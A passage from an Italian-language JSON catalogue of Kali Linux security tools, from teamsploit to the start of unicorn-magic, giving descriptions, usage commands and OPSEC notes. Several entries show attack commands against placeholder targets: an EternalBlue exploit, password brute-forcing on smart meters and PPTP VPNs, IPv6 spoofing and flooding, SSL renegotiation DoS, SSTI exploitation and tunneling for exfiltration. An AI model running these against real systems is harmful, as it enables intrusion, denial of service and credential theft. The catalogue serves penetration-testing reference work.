    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Teamsploit è un wrapper per Metasploit che facilita la collaborazione multi-utente durante engagement di penetration testing. Permette a team di operatori di condividere sessioni e coordinare attacchi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-User:</strong> collaborazione simultanea tra operatori</p><p><strong>Session Sharing:</strong> condivisione sessioni Meterpreter</p><p><strong>Command History:</strong> log condiviso delle azioni</p><p><strong>Real-Time:</strong> sincronizzazione in tempo reale</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia server teamsploit\nteamsploit-server\n\n# Connetti client\nteamsploit-client --server 192.168.1.100\n\n# Dentro Metasploit condiviso\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.0.0.1\nexploit</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>team engagements</strong>, coordina operatori su stesso target. Per <strong>training</strong>, istruttore e studenti condividono sessione. Per <strong>red team</strong>, collaborazione su operazioni complesse.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Network:</strong> traffico tra client e server non sempre cifrato. <strong>Logging:</strong> tutti i comandi sono loggati. <strong>Authentication:</strong> verificare autenticazione del server.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "termineter",
    "name": "termineter",
    "version": "1.0.6",
    "icon": "../app/icons/termineter-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/termineter/",
    "desc": "Framework pentesting smart meter via protocolli AMI: C12.18, C12.19, ANSI.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Termineter è un framework per security assessment di smart meter e sistemi AMI (Advanced Metering Infrastructure). Supporta protocolli ANSI C12.18/C12.19 per testare contatori elettrici intelligenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Protocol Support:</strong> ANSI C12.18, C12.19, DLMS</p><p><strong>Optical Probe:</strong> supporto sonde ottiche per smart meter</p><p><strong>Table Reading:</strong> legge tabelle dati contatori</p><p><strong>Security Testing:</strong> brute force password e bypass authentication</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia termineter\ntermineter\n\n# Connetti via seriale\nconnect --serial /dev/ttyUSB0\n\n# Login al meter\nlogin --password 00000000\n\n# Leggi tabelle\nread_table 0\nread_table 1\n\n# Brute force password\nbrute_force --wordlist passwords.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>utility security</strong>, testa sicurezza contatori. Per <strong>ICS assessment</strong>, valuta infrastruttura AMI. Per <strong>research</strong>, analizza protocolli smart grid.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legal:</strong> accesso non autorizzato a meter è illegale. <strong>Physical:</strong> richiede accesso fisico al contatore. <strong>Damage:</strong> comandi errati possono danneggiare dispositivi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "IoT"
    ],
    "notes": null
  },
  {
    "id": "testssl.sh",
    "name": "testssl.sh",
    "version": "3.2.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/testssl.sh/",
    "desc": "Script bash per test completo TLS/SSL: cipher, vulnerabilità, certificate chain.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>testssl.sh è uno script bash completo per testing SSL/TLS che non richiede dipendenze esterne. Verifica cipher, protocolli, certificate chain e vulnerabilità note con output colorato e formattato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>No Dependencies:</strong> usa solo openssl presente nel sistema</p><p><strong>Comprehensive:</strong> test 400+ cipher, tutte le vulnerabilità note</p><p><strong>Output Formats:</strong> HTML, JSON, CSV per automazione</p><p><strong>Rating:</strong> assegna rating sicurezza (A-F)</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Test completo\ntestssl.sh https://target.com\n\n# Solo vulnerabilità\ntestssl.sh --vulnerable target.com:443\n\n# Output JSON\ntestssl.sh --jsonfile result.json target.com\n\n# Con rating\ntestssl.sh --severity target.com\n\n# STARTTLS per email\ntestssl.sh --starttls smtp mail.target.com:25</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>compliance audit</strong>, verifica requisiti PCI-DSS/HIPAA. Per <strong>security assessment</strong>, identifica configurazioni deboli. Per <strong>reporting</strong>, genera documentazione formattata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Connections:</strong> genera molte connessioni TLS. <strong>Detection:</strong> pattern scan riconoscibile. <strong>Logging:</strong> test loggabili dal target.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "thc-ipv6",
    "name": "thc-ipv6",
    "version": "3.8",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/thc-ipv6/",
    "desc": "Toolkit per attacchi IPv6: flooding, spoofing, neighbor discovery, router attacks.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>THC-IPv6 è un toolkit completo per security assessment di reti IPv6. Include tool per attacchi a Neighbor Discovery Protocol, Router Advertisement, flooding e MITM specifici per IPv6.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>NDP Attacks:</strong> spoofing Neighbor Advertisement</p><p><strong>Router Attacks:</strong> fake Router Advertisement, flooding</p><p><strong>MITM:</strong> interception traffico IPv6</p><p><strong>Flooding:</strong> DoS su vari protocolli IPv6</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan host IPv6 su segmento\nalive6 eth0\n\n# Fake router advertisement\nfake_router6 eth0\n\n# Neighbor spoofing (MITM)\nparasite6 eth0\n\n# Flood router solicitation\nflood_router6 eth0\n\n# DOS via fragmentation\nfrag6 -t target_ipv6 eth0</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>IPv6 assessment</strong>, valuta sicurezza implementazione IPv6. Per <strong>MITM</strong>, intercetta traffico su reti IPv6. Per <strong>research</strong>, studia vulnerabilità protocolli IPv6.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Impact:</strong> attacchi possono causare DoS su tutta la rete. <strong>Detection:</strong> IDS possono rilevare attacchi NDP. <strong>Legal:</strong> solo su reti autorizzate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "thc-pptp-bruter",
    "name": "thc-pptp-bruter",
    "version": "0.1.4",
    "icon": "../app/icons/thc-pptp-bruter-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/thc-pptp-bruter/",
    "desc": "Brute force su VPN PPTP per testare password deboli su gateway aziendali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>THC-PPTP-Bruter è uno strumento per brute force di password su VPN PPTP. Testa credenziali contro gateway VPN aziendali identificando account con password deboli.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>PPTP Protocol:</strong> supporto nativo protocollo PPTP</p><p><strong>MSCHAPv2:</strong> brute force autenticazione MS-CHAPv2</p><p><strong>Wordlist:</strong> attacco dizionario con wordlist custom</p><p><strong>Parallel:</strong> connessioni parallele per velocità</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Brute force singolo utente\nthc-pptp-bruter -u admin -w passwords.txt vpn.target.com\n\n# Con porta custom\nthc-pptp-bruter -u admin -w passwords.txt -p 1723 vpn.target.com\n\n# Verbose mode\nthc-pptp-bruter -v -u admin -w passwords.txt vpn.target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>VPN assessment</strong>, testa robustezza credenziali. Per <strong>external pentest</strong>, trova accesso VPN con password deboli. Per <strong>compliance</strong>, verifica policy password su VPN.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Lockout:</strong> tentativi falliti possono bloccare account. <strong>Logging:</strong> VPN gateway loggano tutti i tentativi. <strong>Detection:</strong> molti tentativi generano alert.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "thc-ssl-dos",
    "name": "thc-ssl-dos",
    "version": "1.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/thc-ssl-dos/",
    "desc": "Exploita renegotiation SSL per DoS su server consumando risorse CPU handshake.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>THC-SSL-DOS sfrutta la vulnerabilità di SSL renegotiation per causare denial of service. L'handshake SSL richiede 15x più risorse sul server che sul client, permettendo DoS asimmetrico.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Renegotiation Attack:</strong> forza continui handshake SSL</p><p><strong>Resource Exhaustion:</strong> consuma CPU server con crittografia</p><p><strong>Asymmetric DoS:</strong> poco bandwidth attaccante, molto sul server</p><p><strong>Multi-Connection:</strong> parallela per massimo impatto</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Attacco base\nthc-ssl-dos target.com 443\n\n# Con numero connessioni\nthc-ssl-dos target.com 443 --connections 100\n\n# Accept mode (rinegozia solo se accettato)\nthc-ssl-dos --accept target.com 443</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>resilience testing</strong>, verifica protezione anti-DoS. Per <strong>vulnerability assessment</strong>, testa se renegotiation è abilitata. Per <strong>capacity planning</strong>, valuta impatto su risorse.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Authorization:</strong> SOLO su sistemi autorizzati. <strong>Impact:</strong> causa DoS reale sul target. <strong>Legal:</strong> attacco DoS non autorizzato è reato grave.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "theharvester",
    "name": "theharvester",
    "version": "4.8.2",
    "icon": "../app/icons/theharvester-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/theharvester/",
    "desc": "Raccoglie email, subdomain, IP da fonti pubbliche: Google, Bing, LinkedIn, Shodan.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>TheHarvester è uno strumento OSINT per raccogliere informazioni da fonti pubbliche. Estrae email, nomi, subdomain e IP da motori di ricerca, social network e database pubblici come Shodan.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source:</strong> Google, Bing, LinkedIn, Shodan, Hunter.io</p><p><strong>Email Harvesting:</strong> estrae indirizzi email validi</p><p><strong>Subdomain Discovery:</strong> trova subdomain del target</p><p><strong>Virtual Hosts:</strong> identifica vhost su stesso IP</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Harvesting da tutte le fonti\ntheHarvester -d target.com -b all\n\n# Solo Google\ntheHarvester -d target.com -b google\n\n# LinkedIn per nomi\ntheHarvester -d target.com -b linkedin\n\n# Con limit risultati\ntheHarvester -d target.com -b all -l 500\n\n# Output file\ntheHarvester -d target.com -b all -f output.html</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>reconnaissance</strong>, raccoglie info su target. Per <strong>phishing prep</strong>, crea lista email per campagne. Per <strong>social engineering</strong>, identifica dipendenti e ruoli.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passive:</strong> non contatta direttamente il target. <strong>API Keys:</strong> molte fonti richiedono chiavi API. <strong>Rate Limits:</strong> motori di ricerca possono bloccare.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Email_Harvesting"
    ],
    "notes": null
  },
  {
    "id": "tinja",
    "name": "tinja",
    "version": "1.2.0",
    "icon": "../app/icons/tinja-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/tinja/",
    "desc": "Rileva e exploita Server-Side Template Injection in framework web comuni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Tinja è uno scanner e exploitation tool per Server-Side Template Injection (SSTI). Rileva automaticamente template engine vulnerabili e genera payload per RCE su framework come Jinja2, Twig, Freemarker.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-Detection:</strong> identifica template engine dal comportamento</p><p><strong>Multi-Engine:</strong> Jinja2, Twig, Freemarker, Velocity, Smarty</p><p><strong>RCE Payloads:</strong> genera payload per command execution</p><p><strong>Polyglot:</strong> payload che funzionano su più engine</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan parametro per SSTI\ntinja -u \"http://target.com/page?name=INJECT\"\n\n# Con metodo POST\ntinja -u \"http://target.com/page\" -d \"name=INJECT\"\n\n# Da request file\ntinja -r request.txt\n\n# Genera payload per engine specifico\ntinja -u \"http://target.com/page?name=INJECT\" --engine jinja2</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>web pentest</strong>, trova SSTI in applicazioni web. Per <strong>RCE</strong>, sfrutta SSTI per command execution. Per <strong>bug bounty</strong>, identifica vulnerabilità template injection.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> payload SSTI possono essere loggati. <strong>WAF:</strong> molti WAF bloccano pattern di injection. <strong>Impact:</strong> RCE riuscito dà controllo completo del server.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SSTI"
    ],
    "notes": null
  },
  {
    "id": "tlssled",
    "name": "tlssled",
    "version": "1.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/tlssled/",
    "desc": "Wrapper per sslscan e openssl per audit rapido SSL/TLS con report formattato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>TLSSLed è uno script wrapper che combina sslscan e openssl per audit rapido di configurazioni SSL/TLS. Genera report formattato e colorato con tutte le informazioni rilevanti per security assessment.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Combined Tools:</strong> integra sslscan e openssl s_client</p><p><strong>Quick Audit:</strong> test rapido in singolo comando</p><p><strong>Formatted Output:</strong> report colorato e leggibile</p><p><strong>Vulnerability Check:</strong> verifica configurazioni insicure</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Audit SSL/TLS completo\ntlssled target.com 443\n\n# Solo HTTPS\ntlssled www.target.com 443\n\n# SMTP con STARTTLS\ntlssled mail.target.com 25\n\n# Output su file\ntlssled target.com 443 > report.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>quick assessment</strong>, audit veloce configurazione TLS. Per <strong>reporting</strong>, genera output formattato per documentazione. Per <strong>compliance check</strong>, verifica requisiti minimi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Dependencies:</strong> richiede sslscan installato. <strong>Connections:</strong> genera multiple connessioni. <strong>Detection:</strong> pattern scan identificabile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "tnscmd10g",
    "name": "tnscmd10g",
    "version": "1.3",
    "icon": "../app/icons/tnscmd10g-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/tnscmd10g/",
    "desc": "Invia comandi TNS a Oracle listener per version detection e service enumeration.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>tnscmd10g è uno strumento per interagire con Oracle TNS listener. Permette di inviare comandi TNS per version detection, service enumeration e ottenere informazioni sulla configurazione del database.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Version Detection:</strong> identifica versione Oracle listener</p><p><strong>Service Enumeration:</strong> lista servizi registrati</p><p><strong>Status Query:</strong> ottiene stato listener</p><p><strong>TNS Commands:</strong> invia comandi TNS arbitrari</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Version detection\ntnscmd10g version -h 192.168.1.100\n\n# Status listener\ntnscmd10g status -h 192.168.1.100\n\n# Lista servizi\ntnscmd10g services -h 192.168.1.100\n\n# Porta custom\ntnscmd10g version -h 192.168.1.100 -p 1521</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Oracle enumeration</strong>, raccoglie info su database Oracle. Per <strong>pentest</strong>, identifica versioni vulnerabili. Per <strong>inventory</strong>, mappa istanze Oracle in rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> query TNS loggabili dal listener. <strong>Authentication:</strong> alcuni comandi richiedono password. <strong>Hardening:</strong> listener moderni limitano info esposte.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "Database"
    ],
    "notes": null
  },
  {
    "id": "trufflehog",
    "name": "trufflehog",
    "version": "3.57.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/trufflehog/",
    "desc": "Trova secrets in repository Git: API keys, password, token nei commit storici.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>TruffleHog è uno strumento per trovare secrets esposti in repository Git. Scansiona tutta la history dei commit cercando API keys, password, token e altre credenziali accidentalmente committate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Git History:</strong> scansiona tutti i commit, non solo HEAD</p><p><strong>Entropy Analysis:</strong> rileva stringhe ad alta entropia</p><p><strong>Regex Patterns:</strong> pattern per AWS, GCP, GitHub, Stripe, etc.</p><p><strong>Verification:</strong> verifica se secrets sono ancora validi</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan repository locale\ntrufflehog filesystem /path/to/repo\n\n# Scan GitHub repository\ntrufflehog github --repo https://github.com/org/repo\n\n# Scan organizzazione GitHub\ntrufflehog github --org organization\n\n# Con verifica secrets\ntrufflehog github --repo https://github.com/org/repo --only-verified\n\n# Output JSON\ntrufflehog filesystem /path/to/repo --json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>security audit</strong>, trova secrets esposti in codebase. Per <strong>bug bounty</strong>, cerca credenziali in repo pubblici. Per <strong>DevSecOps</strong>, integra in CI/CD pipeline.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>API Calls:</strong> verification richiede chiamate API. <strong>Rate Limits:</strong> scan grandi repo può colpire rate limits. <strong>Reporting:</strong> segnalare responsabilmente secrets trovati.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "tundeep",
    "name": "tundeep",
    "version": "1.1~git20190802",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/tundeep/",
    "desc": "Tunneling layer 2 per creare bridge virtuali attraverso connessioni TCP/UDP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Tundeep è uno strumento per tunneling Layer 2 che crea bridge virtuali attraverso connessioni TCP o UDP. Permette di estendere reti Ethernet attraverso Internet come se fossero connesse direttamente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>L2 Tunneling:</strong> trasporta frame Ethernet completi</p><p><strong>TCP/UDP:</strong> supporta entrambi i protocolli di trasporto</p><p><strong>TAP Interface:</strong> crea interfaccia TAP virtuale</p><p><strong>Encryption:</strong> supporto cifratura opzionale</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Server mode\ntundeep -s -p 5000\n\n# Client mode\ntundeep -c server_ip -p 5000\n\n# Con UDP invece di TCP\ntundeep -s -u -p 5000\n\n# Specifica interfaccia TAP\ntundeep -s -p 5000 -i tap0</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>pivoting avanzato</strong>, estende rete remota come se fosse locale. Per <strong>pentest</strong>, accede a risorse L2 su reti remote. Per <strong>lab setup</strong>, connette reti di test geograficamente distanti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Traffic:</strong> tunnel L2 genera traffico broadcast. <strong>Detection:</strong> traffico anomalo su porta non standard. <strong>Performance:</strong> overhead rispetto a tunneling L3.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "twofi",
    "name": "twofi",
    "version": "2.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/twofi/",
    "desc": "Genera wordlist da profili Twitter per password cracking targetizzato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Twofi (Twitter Words of Interest) genera wordlist personalizzate da profili Twitter. Estrae parole frequenti dai tweet di un utente per creare dizionari mirati per password cracking.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Twitter Scraping:</strong> estrae tweet da profili pubblici</p><p><strong>Word Extraction:</strong> identifica parole significative</p><p><strong>Frequency Analysis:</strong> ordina per frequenza d'uso</p><p><strong>Custom Rules:</strong> filtra per lunghezza minima</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera wordlist da utente\ntwofi -u target_username\n\n# Con lunghezza minima\ntwofi -u target_username -m 6\n\n# Da lista utenti\ntwofi -U users.txt\n\n# Output su file\ntwofi -u target_username > wordlist.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>targeted cracking</strong>, genera wordlist basate su interessi del target. Per <strong>social engineering</strong>, identifica temi rilevanti per la vittima. Per <strong>password audit</strong>, testa password basate su info personali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>API Limits:</strong> Twitter API ha rate limiting. <strong>Privacy:</strong> raccoglie dati pubblici ma sensibili. <strong>Authentication:</strong> richiede API keys per accesso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "ubertooth",
    "name": "ubertooth",
    "version": "2020.12.R1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ubertooth/",
    "desc": "Piattaforma Bluetooth sniffing e injection per attacchi su BLE e Bluetooth Classic.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Ubertooth è una piattaforma hardware/software per security research su Bluetooth. Permette sniffing, injection e analisi di traffico Bluetooth Classic e BLE a livello di raw PHY layer.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>BT Classic Sniffing:</strong> cattura traffico 2.4GHz Bluetooth</p><p><strong>BLE Support:</strong> analisi Bluetooth Low Energy</p><p><strong>Packet Injection:</strong> inietta pacchetti nel canale</p><p><strong>Spectrum Analysis:</strong> visualizza spettro 2.4GHz</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Spectrum analyzer\nubertooth-specan\n\n# BLE sniffing\nubertooth-btle -f\n\n# Follow BLE device\nubertooth-btle -t AA:BB:CC:DD:EE:FF\n\n# Cattura pacchetti\nubertooth-rx -f\n\n# Dump in formato pcap\nubertooth-btle -f -c capture.pcap</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Bluetooth security</strong>, analizza implementazioni BT/BLE. Per <strong>IoT testing</strong>, reverse engineering protocolli BLE. Per <strong>research</strong>, studia vulnerabilità stack Bluetooth.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Hardware:</strong> richiede hardware Ubertooth One. <strong>Range:</strong> Bluetooth ha range limitato. <strong>Legal:</strong> intercettazione comunicazioni potrebbe essere illegale.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "Bluetooth"
    ],
    "notes": null
  },
  {
    "id": "udptunnel",
    "name": "udptunnel",
    "version": "1.1",
    "icon": "../app/icons/udptunnel-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/udptunnel/",
    "desc": "Tunneling TCP over UDP per bypass firewall che bloccano connessioni TCP in uscita.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>UDPTunnel incapsula connessioni TCP dentro pacchetti UDP per aggirare firewall che bloccano TCP in uscita. Utile in ambienti restrittivi dove solo traffico UDP specifico è consentito.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>TCP over UDP:</strong> incapsula TCP in pacchetti UDP</p><p><strong>Bidirectional:</strong> supporta traffico bidirezionale</p><p><strong>Port Forwarding:</strong> forward porte locali attraverso tunnel</p><p><strong>Lightweight:</strong> overhead minimo</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Server mode (sul server esterno)\nudptunnel -s 5000\n\n# Client mode (rete restrittiva)\nudptunnel -c server_ip 5000 -r localhost:22\n\n# Forward SSH attraverso tunnel\nudptunnel -c server_ip 5000 -r 127.0.0.1:22\nssh -p 22 localhost</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>firewall bypass</strong>, aggira blocchi su TCP outbound. Per <strong>restricted networks</strong>, mantiene connettività quando TCP è bloccato. Per <strong>exfiltration</strong>, canale nascosto via UDP.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>DPI:</strong> traffic analysis può rivelare tunneling. <strong>UDP Issues:</strong> UDP non garantisce delivery. <strong>Detection:</strong> traffico UDP anomalo può essere sospetto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "unhide.rb",
    "name": "unhide.rb",
    "version": "22",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/unhide.rb/",
    "desc": "Script Ruby per rilevare processi e connessioni nascosti da rootkit su sistemi Unix.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Unhide.rb è una reimplementazione Ruby di unhide per rilevare processi e connessioni nascosti da rootkit. Confronta output di diverse syscall per identificare discrepanze indicative di hiding.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Process Detection:</strong> trova processi nascosti da /proc</p><p><strong>TCP/UDP Scan:</strong> rileva porte nascoste</p><p><strong>Multiple Methods:</strong> varie tecniche di detection</p><p><strong>Ruby Implementation:</strong> facilmente estendibile</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan processi nascosti\nunhide-rb proc\n\n# Scan porte TCP nascoste\nunhide-rb tcp\n\n# Scan completo\nunhide-rb all\n\n# Verbose mode\nunhide-rb -v proc</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>rootkit detection</strong>, trova malware che nasconde processi. Per <strong>incident response</strong>, verifica integrità sistema compromesso. Per <strong>forensics</strong>, identifica attività malevole nascoste.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rootkit Aware:</strong> rootkit avanzati possono eludere detection. <strong>False Positives:</strong> condizioni di race possono causare falsi positivi. <strong>Privileges:</strong> richiede root per scan completo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "unhide",
    "name": "unhide",
    "version": "20240510",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/unhide/",
    "desc": "Rileva processi, porte TCP/UDP e filesystem nascosti da rootkit e malware.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Unhide è uno strumento forense per rilevare processi, porte e file nascosti da rootkit. Utilizza multiple tecniche di brute force e confronto syscall per identificare discrepanze nel sistema.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Process Unhiding:</strong> trova PID nascosti da /proc</p><p><strong>TCP/UDP Scanning:</strong> rileva porte non visibili</p><p><strong>Filesystem Check:</strong> trova file nascosti</p><p><strong>Multiple Techniques:</strong> brute force, compare, procfs</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan processi nascosti\nunhide proc\n\n# Scan con tutte le tecniche\nunhide -m -d sys procall brute\n\n# Scan porte TCP/UDP\nunhide-tcp\n\n# Quick scan\nunhide quick\n\n# Scan filesystem\nunhide-posix</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>rootkit hunting</strong>, identifica malware nascosto. Per <strong>forensic analysis</strong>, verifica compromissione sistema. Per <strong>security audit</strong>, baseline integrità sistema.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Performance:</strong> brute force può essere lento. <strong>Kernel Rootkits:</strong> rootkit kernel-level difficili da rilevare. <strong>Live Analysis:</strong> sistema compromesso potrebbe falsificare risultati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "unicorn-magic",
    "name": "unicorn-magic",
    "version": "3.12",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
